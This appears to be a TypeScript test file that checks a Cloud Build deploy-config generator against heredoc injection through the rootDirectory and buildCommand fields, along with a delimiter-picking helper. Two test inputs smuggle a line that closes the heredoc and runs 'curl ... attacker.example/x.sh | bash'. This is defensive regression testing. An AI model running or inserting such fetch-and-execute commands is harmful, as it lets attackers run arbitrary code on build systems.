import { describe, it } from 'node:test';
import assert from 'node:assert';
import { generateCloudRunDeployConfig, pickHeredocMarker } from './cloudbuild';

type BuildStep = { name: string; entrypoint?: string; args?: string[]; dir?: string };

function dockerfileStepScript(rootDirectory?: string, overrides: Record<string, unknown> = {}): string {
    const cfg = generateCloudRunDeployConfig({
        projectSlug: 'p1',
        repoFullName: 'owner/repo',
        branch: 'main',
        commitSha: 'abcdef1234567890',
        framework: 'nextjs',
        rootDirectory,
        ...overrides,
    }) as { steps: BuildStep[] };

    const step = cfg.steps.find(s =>
        s.name === 'gcr.io/cloud-builders/docker' &&
        typeof s.args?.[1] === 'string' &&
        s.args[1].startsWith('if [ ! -f')
    );

    assert.ok(step, 'Dockerfile-writing step should exist');
    return step.args![1];
}

describe('Cloud Build Dockerfile heredoc injection', () => {
    it('should not let rootDirectory close the heredoc and run shell in the build step', () => {
        const payload = "web\nEOFMARKER\ncurl -s http://attacker.example/x.sh | bash\ncat > /workspace/Dockerfile << 'EOFMARKER'";
        const script = dockerfileStepScript(payload);

        assert.ok(!script.includes('curl -s http://attacker.example/x.sh'), 'payload must not reach the build step');

        const lines = script.split('\n');
        const openIndex = lines.findIndex(l => l.includes("<< '"));
        const marker = lines[openIndex].split("<< '")[1].replace(/'$/, '');
        const closeIndex = lines.findIndex((l, i) => i > openIndex && l.trim() === marker);

        assert.ok(closeIndex > openIndex, 'heredoc must be closed');
        assert.strictEqual(
            lines.slice(closeIndex + 1).join('\n').trim(),
            'fi',
            'nothing but "fi" may follow the heredoc terminator'
        );
    });

    it('should not let buildCommand close the heredoc either', () => {
        const script = dockerfileStepScript('', {
            buildCommand: "npm run build\nEOFMARKER\ncurl -s http://attacker.example/x.sh | bash",
        });

        const lines = script.split('\n');
        const openIndex = lines.findIndex(l => l.includes("<< '"));
        const marker = lines[openIndex].split("<< '")[1].replace(/'$/, '');

        assert.notStrictEqual(marker, 'EOFMARKER', 'marker must rotate when the body contains EOFMARKER');
        assert.strictEqual(
            lines.filter(l => l.trim() === marker).length,
            1,
            'exactly one line may terminate the heredoc'
        );

        const closeIndex = lines.findIndex((l, i) => i > openIndex && l.trim() === marker);
        assert.strictEqual(lines.slice(closeIndex + 1).join('\n').trim(), 'fi');
    });

    it('should keep the literal EOFMARKER delimiter for every benign project', () => {
        for (const rootDirectory of ['', undefined, '.', 'web', 'apps/web', 'apps/web/', './packages/site', 'apps/@scope/web']) {
            const script = dockerfileStepScript(rootDirectory);
            assert.ok(
                script.includes("<< 'EOFMARKER'"),
                `delimiter must stay EOFMARKER for rootDirectory=${JSON.stringify(rootDirectory)}`
            );
        }
    });

    it('should keep rendering the raw rootDirectory in the Dockerfile while STRICT_ROOT_DIRECTORY is off', () => {
        // Guards the live tenants whose rootDirectory falls outside the narrow workDir charset.
        assert.ok(dockerfileStepScript('apps/@scope/web').includes('cd apps/@scope/web && npm run build'));
    });

    it('pickHeredocMarker should return a delimiter absent from the content', () => {
        assert.strictEqual(pickHeredocMarker('FROM node\nRUN echo hi'), 'EOFMARKER');
        assert.strictEqual(pickHeredocMarker('a\nEOFMARKER\nb'), 'EOFMARKER_1');
        assert.strictEqual(pickHeredocMarker('EOFMARKER\nEOFMARKER_1\nEOFMARKER_2'), 'EOFMARKER_3');
    });
});
